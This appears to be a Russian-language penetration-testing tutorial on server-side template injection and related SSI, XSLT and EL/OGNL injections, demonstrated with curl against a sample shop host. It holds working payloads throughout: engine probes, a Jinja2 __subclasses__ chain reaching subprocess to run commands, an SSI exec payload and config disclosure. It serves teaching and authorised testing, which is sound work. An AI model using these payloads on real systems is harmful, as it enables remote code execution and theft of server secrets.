## Задача

**SSTI** (Server-Side Template Injection) — инъекция в шаблонизатор: данные, которые ты прислал, интерпретируются как выражение шаблона и вычисляются на сервере. Иногда это `{{7*7}}` → `49`, иногда — прямая дорога к RCE. Рядом живут родственные инъекции: **SSI**, **XSLT** и выражения **EL/OGNL**.

Разберём один шаблонизатор и его родственников.

## Наш пример: приветствие с именем

Магазин приветствует по имени: `?name=Alice` → «Hello, Alice». Попробуем математическое выражение:

```bash
$ curl -s 'https://shop.local/greet?name=Alice'
Hello, Alice
$ curl -s 'https://shop.local/greet?name={{7*7}}'
Hello, 49
```

`{{7*7}}` вычислилось в `49`. Это **SSTI**: сервер подставил наш ввод в шаблон Jinja2 и выполнил выражение. Дальше можно попытаться выйти к системным командам.

## Шаг 1: определяем движок

Разные движки — разные payload. Проверим несколькими выражениями:

```bash
$ curl -s 'https://shop.local/greet?name=${7*7}'    # JSP EL / Freemarker?
Hello, ${7*7}
$ curl -s 'https://shop.local/greet?name=#{7*7}'    # Ruby/Thymeleaf?
Hello, #{7*7}
$ curl -s 'https://shop.local/greet?name={{7*7}}'   # Jinja2/Twig
Hello, 49
$ curl -s 'https://shop.local/greet?name=<%= 7*7 %>' # ERB (Ruby)
Hello, <%= 7*7 %>
```

Сработало только `{{...}}` — значит, Jinja2 или Twig (Python/PHP). Движок определён.

## Шаг 2: от выражения к объектам

В Jinja2 есть доступ к объектам Python. Классический путь — через `__class__` и подклассы добраться до `subprocess`:

```bash
$ curl -s 'https://shop.local/greet?name={{7*7}}'
Hello, 49
$ curl -s --data-urlencode 'name={{config}}' https://shop.local/greet
Hello, <Config {'SECRET_KEY': 'dev-key', ...}>
```

`{{config}}` отдал конфиг — мы читаем внутренние объекты. Дальше — выполнение команд:

```bash
$ curl -s --data-urlencode "name={{''.__class__.__mro__[1].__subclasses__()}}" https://shop.local/greet | head -c 120
Hello, [<class 'type'>, <class 'weakref'>, ..., <class 'subprocess.Popen'>]
```

Мы видим `subprocess.Popen` в списке подклассов — путь к RCE открыт:

```bash
$ curl -s --data-urlencode "name={{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}" https://shop.local/greet
Hello, b'uid=33(www-data) ...'
```

## Шаг 3: родственники — SSI и XSLT

Не всё SSTI выглядит как `{{...}}`. Три родственных движка:

- **SSI** (Server Side Includes): сервер обрабатывает `<!--#echo var="DATE_LOCAL" -->` в HTML. Пробуем:

```bash
$ curl -s --data-urlencode 'name=<!--#exec cmd="id"-->' https://shop.local/greet
Hello, uid=33(www-data)
```

- **XSLT**: если приложение принимает XML и прогоняет через XSLT-трансформацию, можно внедрить `<xsl:value-of select="system-property('xsl:version')"/>` и добраться до расширений.

- **EL/OGNL** (Java): `${...}` в JSP EL или OGNL в Struts. OGNL-инъекция даёт RCE напрямую:

```bash
$ curl -s --data-urlencode "name=%{7*7}" https://shop.local/greet
Hello, 49   # OGNL-выражение
```

## Шаг 4: как искать SSTI

- **Полиглот-детектор:** `${{<%[%'"}}%\` — если где-то ломается, сузь до конкретного синтаксиса.
- **Математика:** `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`, `%{7*7}`.
- **Контексты:** имя, тема письма, PDF-отчёт, уведомление, имя файла.
- **Вывод:** если `49` появилось — движок исполняет выражения.
- **Ошибки:** сломай шаблон (`{{`) и читай traceback — он часто называет движок и версию.

## Если не сработало

- **Экранируется** — проверь другой контекст (атрибут, JS), другой движок.
- **Песочница** — переходи к `web-ssti-advanced` (побег из sandbox).
- **Нет вывода** — blind SSTI: используй time-based (`{{range(1000000)}}`) или OOB.
- **SSI не включён** — нужен `Options +Includes`; проверь по ошибке.

## Что мы теперь знаем

- SSTI — ввод становится выражением шаблона и вычисляется на сервере.
- Движок определяют по синтаксису: `{{}}`, `${}`, `#{}`, `<%= %>`, `%{}`.
- Jinja2 даёт путь к `subprocess` через `__class__`/`__subclasses__`.
- SSI, XSLT и EL/OGNL — родственные инъекции с тем же принципом.

## Частые вопросы

**SSTI и XSS — это одно и то же?** Нет. XSS исполняется в **браузере** жертвы, SSTI — на **сервере**. SSTI опаснее: он сразу даёт доступ к серверу, а не к чужой сессии.

**Почему `{{7*7}}` даёт 49, а не выводит строку?** Потому что сервер подставил ввод не как текст, а как **выражение** шаблона. Если бы он экранировал ввод, ты бы увидел буквально `{{7*7}}`.

**Что если сработал `${7*7}`?** Это другой движок — Java (JSP EL, Freemarker) или Thymeleaf. Синтаксис подсказывает, где искать цепочку до RCE.

**SSTI встречается только в веб-формах?** Нет: имена в письмах, PDF-отчёты, уведомления, темы — всё, что рендерится шаблоном. Проверяй любой текст, который потом «подставляется».

**Можно ли проверить безопасно?** Да: начни с `{{7*7}}`. Если число вычислилось — уязвимость есть; дальше действуй только с разрешения владельца.

## Ещё один сценарий: SSTI в теме письма

Шаблоны встречаются не только на страницах. Приложение отправляет приветственное письмо с именем пользователя в теме:

```bash
$ curl -s -d 'name={{7*7}}' https://shop.local/api/newsletter
{"status":"queued"}
```

Проверим, пришло ли письмо с `49` — если да, шаблон рендерится **на сервере**. Теперь проверим PDF-отчёт:

```bash
$ curl -s 'https://shop.local/report.pdf?title=${7*7}' -o r.pdf
$ pdftotext r.pdf - | head -1
49
```

`${7*7}` вычислилось в PDF — движок другой (Java/Freemarker), но принцип тот же. Вывод: SSTI ищут **везде**, где текст рендерится шаблоном.

## На что смотреть дальше

- **Синтаксисы.** `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`, `%{7*7}`.
- **Контексты.** Имя, тема письма, PDF, уведомление, имя файла.
- **Ошибки.** Сломай шаблон (`{{`) — traceback назовёт движок и версию.
- **Объекты.** `{{config}}`, `{{self}}`, `{{7*'7'}}` — как движок реагирует.
- **Родственники.** SSI (`<!--#exec -->`), XSLT, EL/OGNL.
- **Безопасно.** Начинай с математики; RCE — только с разрешения.
